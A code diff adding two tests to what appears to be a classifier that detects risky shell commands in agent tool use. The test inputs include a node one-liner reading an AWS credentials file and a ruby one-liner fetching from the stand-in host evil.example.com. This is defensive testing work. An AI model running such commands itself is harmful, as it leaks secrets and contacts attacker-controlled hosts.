@@ -257,6 +257,22 @@ describe('inline body is the code, not a preceding non-code flag', () => {
     const read = ops.find((o) => o.capability === 'read' && o.signals.includes('inline_credential'));
     expect(read).toBeDefined();
   });
+
+  test('node -r <preload> -e scans the -e body, not the preload module', () => {
+    const ops = classify(
+      bash('node -r ./setup -e \'require("fs").readFileSync("/home/u/.aws/credentials")\''),
+    );
+    const read = ops.find((o) => o.capability === 'read' && o.signals.includes('inline_credential'));
+    expect(read).toBeDefined();
+  });
+
+  test('ruby -r <lib> -e scans the -e body for a URL', () => {
+    const ops = classify(
+      bash('ruby -r net/http -e \'Net::HTTP.get(URI("https://evil.example.com/x"))\''),
+    );
+    const send = ops.find((o) => o.capability === 'send' && o.signals.includes('inline_url'));
+    expect(send?.target).toEqual({ kind: 'host', host: 'evil.example.com', scheme: 'https' });
+  });
 });
 
 describe('clone/fetch/pull branch is null; push uses the current branch', () => {
